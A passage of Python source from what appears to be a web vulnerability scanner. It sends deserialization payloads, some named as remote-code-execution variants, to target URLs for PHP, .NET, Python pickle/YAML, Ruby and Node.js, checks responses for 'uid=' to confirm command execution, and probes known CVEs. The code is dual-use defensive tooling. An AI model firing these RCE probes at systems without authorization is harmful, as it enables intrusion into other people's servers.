    async def _test_php_object_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for PHP object injection vulnerabilities."""
        findings = []
        
        # Test different PHP gadget chains
        php_payloads = [
            ("basic", self.DETECTION_PAYLOADS["php"]["basic"]),
            ("guzzle", self.DETECTION_PAYLOADS["php"]["guzzle"]),
            ("monolog", self.DETECTION_PAYLOADS["php"]["monolog"]),
            ("symfony", self.DETECTION_PAYLOADS["php"]["symfony"]),
        ]
        
        for url in urls[:15]:
            for param in self.SERIALIZATION_POINTS[:8]:
                for payload_name, payload in php_payloads:
                    await rate_limiter.acquire()
                    
                    try:
                        # GET request
                        test_url = f"{url}?{param}={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for PHP deserialization indicators
                        php_indicators = [
                            "unserialize()",
                            "__wakeup",
                            "__destruct",
                            "__toString",
                            "Object of class",
                            "could not be converted to string",
                            "Allowed memory size",
                            "Call to undefined method",
                            "Call to a member function",
                            "Fatal error",
                        ]
                        
                        found_indicator = None
                        for indicator in php_indicators:
                            if indicator in response.text:
                                found_indicator = indicator
                                break
                        
                        if found_indicator:
                            # Determine severity based on gadget type
                            severity = "CRITICAL" if payload_name in ["guzzle", "monolog", "symfony"] else "HIGH"
                            
                            findings.append(Finding(
                                name=f"PHP Object Injection ({payload_name})",
                                severity=severity,
                                confidence="HIGH",
                                description=f"PHP unserialize() processes parameter '{param}'",
                                matched_at=url,
                                evidence=[
                                    f"Parameter: {param}",
                                    f"Gadget tested: {payload_name}",
                                    f"PHP indicator: {found_indicator}",
                                ],
                                cwe="CWE-502",
                                cvss_score=9.8 if severity == "CRITICAL" else 8.1,
                                remediation="Use json_decode() instead of unserialize(). "
                                           "Never unserialize user-controlled input.",
                            ))
                            
                            self.test_results.append(DeserTestResult(
                                vuln_type=DeserVulnType.PHP_OBJECT,
                                parameter=param,
                                endpoint=url,
                                evidence=[found_indicator],
                                error_based=True,
                            ))
                            break  # Found vulnerability, move to next parameter
                        
                        # Also test POST data
                        await rate_limiter.acquire()
                        response = await client.post(url, data={param: payload})
                        
                        for indicator in php_indicators:
                            if indicator in response.text:
                                findings.append(Finding(
                                    name=f"PHP Object Injection POST ({payload_name})",
                                    severity="CRITICAL",
                                    confidence="HIGH",
                                    description=f"PHP unserialize() processes POST parameter '{param}'",
                                    matched_at=url,
                                    evidence=[f"POST parameter: {param}", f"Gadget: {payload_name}"],
                                    cwe="CWE-502",
                                    cvss_score=9.8,
                                    remediation="Never use unserialize() on POST data.",
                                ))
                                break
                                
                    except Exception as e:
                        logger.debug(f"Error testing PHP object injection: {e}")
        
        # Test PHP-specific endpoints
        for endpoint in self.PHP_ENDPOINTS[:10]:
            await rate_limiter.acquire()
            
            try:
                url = urljoin(base_url, endpoint)
                response = await client.get(url)
                
                # Check if endpoint exists and might be vulnerable
                if response.status_code == 200:
                    if "laravel" in endpoint or "ignition" in endpoint:
                        if "_ignition" in response.text or "Ignition" in response.text:
                            findings.append(Finding(
                                name="Laravel Ignition Detected",
                                severity="HIGH",
                                confidence="HIGH",
                                description="Laravel Ignition debug interface detected - potential CVE-2021-3129",
                                matched_at=url,
                                evidence=["Ignition interface accessible"],
                                cwe="CWE-502",
                                cvss_score=9.8,
                                remediation="Disable debug mode in production. Update to Ignition >= 2.5.2.",
                            ))
                            
            except Exception as e:
                logger.debug(f"Error testing PHP endpoint: {e}")
        
        return findings
    
    async def _test_viewstate(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for .NET ViewState deserialization vulnerabilities."""
        findings = []
        
        # Look for .aspx pages
        aspx_urls = [u for u in urls if ".aspx" in u.lower()]
        test_urls = aspx_urls or [base_url]
        
        for url in test_urls[:10]:
            await rate_limiter.acquire()
            
            try:
                response = await client.get(url)
                
                # Look for ViewState
                viewstate_match = re.search(
                    r'<input[^>]*name="__VIEWSTATE"[^>]*value="([^"]*)"',
                    response.text,
                    re.IGNORECASE
                )
                
                if viewstate_match:
                    viewstate = viewstate_match.group(1)
                    
                    # Check if ViewState is encrypted/MAC protected
                    generator_match = re.search(
                        r'<input[^>]*name="__VIEWSTATEGENERATOR"[^>]*value="([^"]*)"',
                        response.text,
                        re.IGNORECASE
                    )
                    
                    mac_match = re.search(
                        r'<input[^>]*name="__VIEWSTATEMAC"',
                        response.text,
                        re.IGNORECASE
                    )
                    
                    eventvalidation_match = re.search(
                        r'<input[^>]*name="__EVENTVALIDATION"[^>]*value="([^"]*)"',
                        response.text,
                        re.IGNORECASE
                    )
                    
                    if not mac_match:
                        # ViewState without MAC - serious vulnerability
                        findings.append(Finding(
                            name="ViewState Without MAC Protection",
                            severity="CRITICAL",
                            confidence="HIGH",
                            description="ASP.NET ViewState is not MAC protected, enabling deserialization attacks",
                            matched_at=url,
                            evidence=[
                                "ViewState found without MAC validation",
                                f"ViewState length: {len(viewstate)} chars",
                                f"Generator: {generator_match.group(1) if generator_match else 'Not found'}",
                            ],
                            cwe="CWE-502",
                            cvss_score=9.8,
                            remediation="Enable ViewState MAC validation in web.config: "
                                       '<pages enableViewStateMac="true" />. '
                                       "Set machineKey with random keys.",
                        ))
                        
                        self.test_results.append(DeserTestResult(
                            vuln_type=DeserVulnType.DOTNET_VIEWSTATE,
                            endpoint=url,
                            evidence=["MAC disabled"],
                            cve_ids=["CVE-2020-0688", "CVE-2020-16952"],
                        ))
                    
                    # Try to decode ViewState
                    try:
                        # Remove URL encoding if present
                        vs_clean = viewstate.replace("%2B", "+").replace("%2F", "/").replace("%3D", "=")
                        decoded = base64.b64decode(vs_clean)
                        
                        # Check for .NET serialization markers
                        if decoded.startswith(self.DOTNET_VIEWSTATE_PREFIX_V1) or \
                           decoded.startswith(self.DOTNET_VIEWSTATE_PREFIX_V2):
                            findings.append(Finding(
                                name="ASP.NET ViewState Structure Analyzed",
                                severity="MEDIUM",
                                confidence="HIGH",
                                description="ViewState structure identified - potential attack surface",
                                matched_at=url,
                                evidence=[
                                    "ViewState uses LosFormatter/ObjectStateFormatter",
                                    f"Size: {len(decoded)} bytes",
                                ],
                                cwe="CWE-502",
                                remediation="Ensure ViewState MAC is enabled with strong keys.",
                            ))
                        
                        if b'\x00\x01' in decoded or b'System.' in decoded:
                            findings.append(Finding(
                                name="ViewState Contains .NET Serialized Objects",
                                severity="HIGH",
                                confidence="MEDIUM",
                                description="ViewState appears to contain .NET serialized objects",
                                matched_at=url,
                                evidence=["Binary .NET serialization markers detected"],
                                cwe="CWE-502",
                                remediation="Use ViewStateUserKey and enable MAC protection.",
                            ))
                            
                    except Exception:
                        pass
                    
                    # Check for known vulnerable ASP.NET patterns
                    if "Exchange" in response.text or "OWA" in response.text:
                        findings.append(Finding(
                            name="Potential Exchange Server ViewState (CVE-2020-0688)",
                            severity="CRITICAL",
                            confidence="MEDIUM",
                            description="Exchange Server detected - check for CVE-2020-0688",
                            matched_at=url,
                            evidence=["Exchange/OWA patterns detected with ViewState"],
                            cwe="CWE-502",
                            cvss_score=8.8,
                            remediation="Apply Exchange Server security updates immediately.",
                        ))
                        
            except Exception as e:
                logger.debug(f"Error testing ViewState: {e}")
        
        return findings
    
    async def _test_dotnet_jsonnet(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for .NET Json.NET TypeNameHandling vulnerabilities."""
        findings = []
        
        jsonnet_payloads = self.DOTNET_PAYLOADS["jsonnet"]["detection_payloads"]
        
        for url in urls[:10]:
            # Test JSON endpoints
            for param in ["data", "json", "body", "payload", "request", "object"]:
                await rate_limiter.acquire()
                
                try:
                    for payload in jsonnet_payloads[:2]:
                        headers = {"Content-Type": "application/json"}
                        
                        # POST with type information
                        response = await client.post(
                            url,
                            content=payload,
                            headers=headers
                        )
                        
                        # Check for TypeNameHandling indicators
                        jsonnet_indicators = [
                            "TypeNameHandling",
                            "$type",
                            "ObjectDataProvider",
                            "System.Windows.Data",
                            "PresentationFramework",
                            "JsonSerializationException",
                            "Type specified in JSON",
                            "Error resolving type",
                        ]
                        
                        for indicator in jsonnet_indicators:
                            if indicator in response.text:
                                findings.append(Finding(
                                    name=".NET Json.NET TypeNameHandling Vulnerability",
                                    severity="CRITICAL",
                                    confidence="HIGH",
                                    description="Json.NET processes $type metadata enabling RCE",
                                    matched_at=url,
                                    evidence=[
                                        f"Indicator: {indicator}",
                                        "TypeNameHandling appears to be enabled",
                                    ],
                                    cwe="CWE-502",
                                    cvss_score=9.8,
                                    remediation="Set TypeNameHandling.None in JsonSerializerSettings. "
                                               "Never use TypeNameHandling.All or Auto.",
                                ))
                                
                                self.test_results.append(DeserTestResult(
                                    vuln_type=DeserVulnType.DOTNET_JSON,
                                    parameter=param,
                                    endpoint=url,
                                    evidence=[indicator],
                                    error_based=True,
                                ))
                                break
                                
                except Exception as e:
                    logger.debug(f"Error testing Json.NET: {e}")
        
        return findings
    
    async def _test_python_pickle(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for Python pickle deserialization vulnerabilities."""
        findings = []
        
        pickle_payloads = [
            ("safe_detect", self.PYTHON_PAYLOADS["pickle"]["safe_detect"]),
            ("rce_v0", self.PYTHON_PAYLOADS["pickle"]["rce_exec_v0"]),
        ]
        
        for url in urls[:10]:
            for param in self.SERIALIZATION_POINTS[:8]:
                for payload_name, payload in pickle_payloads:
                    await rate_limiter.acquire()
                    
                    try:
                        # Test in query parameter
                        test_url = f"{url}?{param}={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for pickle-related errors
                        pickle_indicators = [
                            "pickle",
                            "unpickle",
                            "cPickle",
                            "_pickle",
                            "loads()",
                            "UnpicklingError",
                            "could not find MARK",
                            "invalid load key",
                            "EOFError",
                            "insecure string pickle",
                            "GLOBAL",
                            "REDUCE",
                        ]
                        
                        found_indicator = None
                        for indicator in pickle_indicators:
                            if indicator.lower() in response.text.lower():
                                found_indicator = indicator
                                break
                        
                        if found_indicator:
                            findings.append(Finding(
                                name="Python Pickle Deserialization",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description=f"Python pickle processes parameter '{param}'",
                                matched_at=url,
                                evidence=[
                                    f"Parameter: {param}",
                                    f"Pickle indicator: {found_indicator}",
                                    f"Payload type: {payload_name}",
                                ],
                                cwe="CWE-502",
                                cvss_score=9.8,
                                remediation="Never use pickle.loads() on untrusted data. "
                                           "Use JSON or other safe formats.",
                            ))
                            
                            self.test_results.append(DeserTestResult(
                                vuln_type=DeserVulnType.PYTHON_PICKLE,
                                parameter=param,
                                endpoint=url,
                                evidence=[found_indicator],
                                error_based=True,
                            ))
                            break
                        
                        # Check for successful command execution
                        if "uid=" in response.text and "gid=" in response.text:
                            findings.append(Finding(
                                name="Python Pickle RCE Confirmed",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description="Remote code execution via pickle deserialization confirmed",
                                matched_at=url,
                                evidence=[
                                    f"Parameter: {param}",
                                    "Command execution successful (id output detected)",
                                ],
                                cwe="CWE-502",
                                cvss_score=10.0,
                                remediation="CRITICAL: Remove pickle deserialization immediately.",
                            ))
                            
                            self.test_results.append(DeserTestResult(
                                vuln_type=DeserVulnType.PYTHON_PICKLE,
                                parameter=param,
                                endpoint=url,
                                rce_confirmed=True,
                            ))
                            
                        # Test in POST body
                        await rate_limiter.acquire()
                        response = await client.post(url, data={param: payload})
                        
                        for indicator in pickle_indicators:
                            if indicator.lower() in response.text.lower():
                                findings.append(Finding(
                                    name="Python Pickle POST Parameter",
                                    severity="CRITICAL",
                                    confidence="HIGH",
                                    description=f"Pickle processes POST parameter '{param}'",
                                    matched_at=url,
                                    evidence=[f"POST parameter: {param}"],
                                    cwe="CWE-502",
                                    cvss_score=9.8,
                                    remediation="Remove pickle deserialization from POST handlers.",
                                ))
                                break
                                
                    except Exception as e:
                        logger.debug(f"Error testing pickle: {e}")
        
        return findings
    
    async def _test_python_yaml(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for Python PyYAML unsafe load vulnerabilities."""
        findings = []
        
        yaml_payloads = [
            ("basic", self.PYTHON_PAYLOADS["yaml"]["rce_basic"]),
            ("subprocess", self.PYTHON_PAYLOADS["yaml"]["rce_subprocess"]),
        ]
        
        for url in urls[:10]:
            for param in ["yaml", "config", "data", "settings", "content"]:
                for payload_name, payload in yaml_payloads:
                    await rate_limiter.acquire()
                    
                    try:
                        # Test YAML content type
                        headers = {"Content-Type": "application/x-yaml"}
                        response = await client.post(url, content=payload, headers=headers)
                        
                        yaml_indicators = [
                            "yaml",
                            "YAMLError",
                            "scanner error",
                            "could not determine a constructor",
                            "expected a single document",
                            "!!python/object",
                            "tag:yaml.org",
                            "safe_load",
                            "FullLoader",
                        ]
                        
                        for indicator in yaml_indicators:
                            if indicator.lower() in response.text.lower():
                                findings.append(Finding(
                                    name="Python YAML Deserialization",
                                    severity="CRITICAL",
                                    confidence="HIGH" if "!!python" in response.text else "MEDIUM",
                                    description="PyYAML unsafe load detected",
                                    matched_at=url,
                                    evidence=[
                                        f"YAML indicator: {indicator}",
                                        f"Payload: {payload_name}",
                                    ],
                                    cwe="CWE-502",
                                    cvss_score=9.8,
                                    remediation="Use yaml.safe_load() instead of yaml.load(). "
                                               "Never use yaml.full_load() or yaml.unsafe_load().",
                                ))
                                
                                self.test_results.append(DeserTestResult(
                                    vuln_type=DeserVulnType.PYTHON_YAML,
                                    endpoint=url,
                                    evidence=[indicator],
                                    error_based=True,
                                    cve_ids=["CVE-2020-1747", "CVE-2017-18342"],
                                ))
                                break
                        
                        # Check for RCE
                        if "uid=" in response.text:
                            findings.append(Finding(
                                name="Python YAML RCE Confirmed",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description="Remote code execution via PyYAML confirmed",
                                matched_at=url,
                                evidence=["Command execution detected"],
                                cwe="CWE-502",
                                cvss_score=10.0,
                                remediation="CRITICAL: Switch to yaml.safe_load() immediately.",
                            ))
                            
                    except Exception as e:
                        logger.debug(f"Error testing YAML: {e}")
        
        return findings
    
    async def _test_ruby_deserialization(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for Ruby Marshal and YAML deserialization."""
        findings = []
        
        # Test Ruby Marshal
        marshal_payload = self.RUBY_PAYLOADS["marshal"]["detection_gem_installer"]
        
        for url in urls[:10]:
            for param in self.SERIALIZATION_POINTS[:6]:
                await rate_limiter.acquire()
                
                try:
                    test_url = f"{url}?{param}={quote(marshal_payload)}"
                    response = await client.get(test_url)
                    
                    ruby_indicators = [
                        "Marshal",
                        "TypeError",
                        "dump format error",
                        "instance variable",
                        "ArgumentError",
                        "Gem::Installer",
                        "undefined class",
                        "incompatible marshal",
                    ]
                    
                    for indicator in ruby_indicators:
                        if indicator in response.text:
                            findings.append(Finding(
                                name="Ruby Marshal Deserialization",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description=f"Ruby Marshal.load processes parameter '{param}'",
                                matched_at=url,
                                evidence=[
                                    f"Parameter: {param}",
                                    f"Ruby indicator: {indicator}",
                                ],
                                cwe="CWE-502",
                                cvss_score=9.8,
                                remediation="Use JSON instead of Marshal. Never Marshal.load untrusted data.",
                            ))
                            
                            self.test_results.append(DeserTestResult(
                                vuln_type=DeserVulnType.RUBY_MARSHAL,
                                parameter=param,
                                endpoint=url,
                                evidence=[indicator],
                                error_based=True,
                                cve_ids=["CVE-2013-0156", "CVE-2019-5420"],
                            ))
                            break
                            
                except Exception as e:
                    logger.debug(f"Error testing Ruby Marshal: {e}")
        
        # Test Ruby YAML
        yaml_payload = self.RUBY_PAYLOADS["yaml"]["simple_rce"]
        
        for url in urls[:8]:
            await rate_limiter.acquire()
            
            try:
                headers = {"Content-Type": "application/x-yaml"}
                response = await client.post(url, content=yaml_payload, headers=headers)
                
                if "Gem::" in response.text or "Psych::" in response.text:
                    findings.append(Finding(
                        name="Ruby YAML Deserialization",
                        severity="CRITICAL",
                        confidence="HIGH",
                        description="Ruby YAML.load processes untrusted input",
                        matched_at=url,
                        evidence=["Ruby Gem/Psych classes detected in response"],
                        cwe="CWE-502",
                        cvss_score=9.8,
                        remediation="Use YAML.safe_load instead of YAML.load.",
                    ))
                    
            except Exception as e:
                logger.debug(f"Error testing Ruby YAML: {e}")
        
        return findings
    
    async def _test_node_serialize(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for Node.js deserialization vulnerabilities."""
        findings = []
        
        node_payloads = [
            ("node-serialize", self.NODEJS_PAYLOADS["node-serialize"]["payloads"]["detect"]),
            ("funcster", self.NODEJS_PAYLOADS["funcster"]["payloads"]["rce"]),
        ]
        
        for url in urls[:10]:
            for param in self.SERIALIZATION_POINTS[:8]:
                for payload_name, payload in node_payloads:
                    await rate_limiter.acquire()
                    
                    try:
                        # Try in cookie
                        cookies = {param: payload}
                        response = await client.get(url, cookies=cookies)
                        
                        node_indicators = [
                            "_$$ND_FUNC$$_",
                            "__js_function",
                            "SyntaxError: Unexpected token",
                            "ReferenceError",
                            "TypeError: Cannot read property",
                            "node-serialize",
                            "unserialize",
                        ]
                        
                        for indicator in node_indicators:
                            if indicator in response.text:
                                marker = self.NODEJS_PAYLOADS[payload_name.split("-")[0] if "-" in payload_name else payload_name].get("marker", "")
                                
                                findings.append(Finding(
                                    name=f"Node.js {payload_name} Vulnerability",
                                    severity="CRITICAL",
                                    confidence="HIGH",
                                    description=f"{payload_name} processes cookie '{param}'",
                                    matched_at=url,
                                    evidence=[
                                        f"Cookie: {param}",
                                        f"Indicator: {indicator}",
                                        f"Marker: {marker}" if marker else "",
                                    ],
                                    cwe="CWE-502",
                                    cvss_score=9.8,
                                    remediation=f"Remove {payload_name} package. Use JSON.parse/stringify.",
                                ))
                                
                                self.test_results.append(DeserTestResult(
                                    vuln_type=DeserVulnType.NODE_SERIALIZE,
                                    parameter=param,
                                    endpoint=url,
                                    evidence=[indicator],
                                    cve_ids=["CVE-2017-5941"] if payload_name == "node-serialize" else [],
                                ))
                                break
                        
                        # Check for RCE
                        if "uid=" in response.text:
                            findings.append(Finding(
                                name="Node.js Deserialization RCE Confirmed",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description=f"RCE via {payload_name} in cookie '{param}'",
                                matched_at=url,
                                evidence=["Command execution detected"],
                                cwe="CWE-502",
                                cvss_score=10.0,
                                remediation=f"CRITICAL: Remove {payload_name} immediately.",
                            ))
                        
                        # Try in query parameter
                        await rate_limiter.acquire()
                        test_url = f"{url}?{param}={quote(payload)}"
                        response = await client.get(test_url)
                        
                        for indicator in node_indicators:
                            if indicator in response.text:
                                findings.append(Finding(
                                    name=f"Node.js {payload_name} in Parameter",
                                    severity="CRITICAL",
                                    confidence="HIGH",
                                    description=f"{payload_name} processes parameter '{param}'",
                                    matched_at=url,
                                    evidence=[f"Parameter: {param}"],
                                    cwe="CWE-502",
                                    cvss_score=9.8,
                                    remediation="Never deserialize user-controlled input.",
                                ))
                                break
                                
                    except Exception as e:
                        logger.debug(f"Error testing {payload_name}: {e}")
        
        return findings
    
    async def _test_known_cves(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for specific known CVEs based on detected framework."""
        findings = []
        
        if not self.detected_framework:
            return findings
        
        framework = self.detected_framework
        
        # Test framework-specific CVEs
        if "weblogic" in framework.name.lower():
            # CVE-2017-10271 - XMLDecoder
            await rate_limiter.acquire()
            try:
                wls_wsat_url = urljoin(base_url, "/wls-wsat/CoordinatorPortType")
                response = await client.get(wls_wsat_url)
                
                if response.status_code == 200 or "wls-wsat" in response.text.lower():
                    findings.append(Finding(
                        name="WebLogic WLS-WSAT Endpoint (CVE-2017-10271)",
                        severity="CRITICAL",
                        confidence="HIGH",
                        description="WLS-WSAT endpoint accessible - vulnerable to XMLDecoder RCE",
                        matched_at=wls_wsat_url,
                        evidence=["WLS-WSAT endpoint responds"],
                        cwe="CWE-502",
                        cvss_score=9.8,
                        remediation="Apply Oracle Critical Patch Update or disable WLS-WSAT.",
                    ))
            except Exception as e:
                logger.debug(f"Error testing WebLogic CVE: {e}")
        
        if "spring" in framework.name.lower():
            # CVE-2022-22965 - Spring4Shell
            await rate_limiter.acquire()
            try:
                # Test class.module.classLoader access
                test_url = f"{base_url}?class.module.classLoader.URLs%5B0%5D=test"
                response = await client.get(test_url)
                
                if "classLoader" in response.text or response.status_code == 400:
                    findings.append(Finding(
                        name="Potential Spring4Shell (CVE-2022-22965)",
                        severity="CRITICAL",
                        confidence="MEDIUM",
                        description="Spring application may be vulnerable to Spring4Shell",
                        matched_at=base_url,
                        evidence=["ClassLoader parameter binding detected"],
                        cwe="CWE-94",
                        cvss_score=9.8,
                        remediation="Update to Spring Framework 5.3.18+ or 5.2.20+.",
                    ))
            except Exception as e:
                logger.debug(f"Error testing Spring4Shell: {e}")
        
        if "jenkins" in framework.name.lower():
            # CVE-2017-1000353 - Jenkins CLI
            await rate_limiter.acquire()
            try:
                cli_url = urljoin(base_url, "/cli")
                response = await client.get(cli_url)
                
                if response.status_code == 200:
                    findings.append(Finding(
                        name="Jenkins CLI Endpoint Accessible",
                        severity="HIGH",
                        confidence="HIGH",
                        description="Jenkins CLI endpoint detected - check for deserialization CVEs",
                        matched_at=cli_url,
                        evidence=["CLI endpoint accessible"],
                        cwe="CWE-502",
                        cvss_score=9.8,
                        remediation="Disable CLI over HTTP/HTTPS. Update Jenkins.",
                    ))
            except Exception as e:
                logger.debug(f"Error testing Jenkins: {e}")
        
        if "exchange" in framework.name.lower():
            # CVE-2020-0688 - Exchange ECP ViewState
            await rate_limiter.acquire()
            try:
                ecp_url = urljoin(base_url, "/ecp/default.aspx")
                response = await client.get(ecp_url)
                
                if "__VIEWSTATE" in response.text:
                    # Check for static machine key indicators
                    generator_match = re.search(
                        r'__VIEWSTATEGENERATOR[^"]*value="([^"]*)"',
                        response.text
                    )
                    if generator_match:
                        findings.append(Finding(
                            name="Exchange ECP ViewState (CVE-2020-0688)",
                            severity="CRITICAL",
                            confidence="MEDIUM",
                            description="Exchange ECP with ViewState - check for CVE-2020-0688",
                            matched_at=ecp_url,
                            evidence=[
                                f"ViewStateGenerator: {generator_match.group(1)}",
                                "If machine key is static, RCE is possible",
                            ],
                            cwe="CWE-502",
                            cvss_score=8.8,
                            remediation="Apply Exchange security updates. Verify unique machine keys.",
                        ))
            except Exception as e:
                logger.debug(f"Error testing Exchange: {e}")
        
        return findings
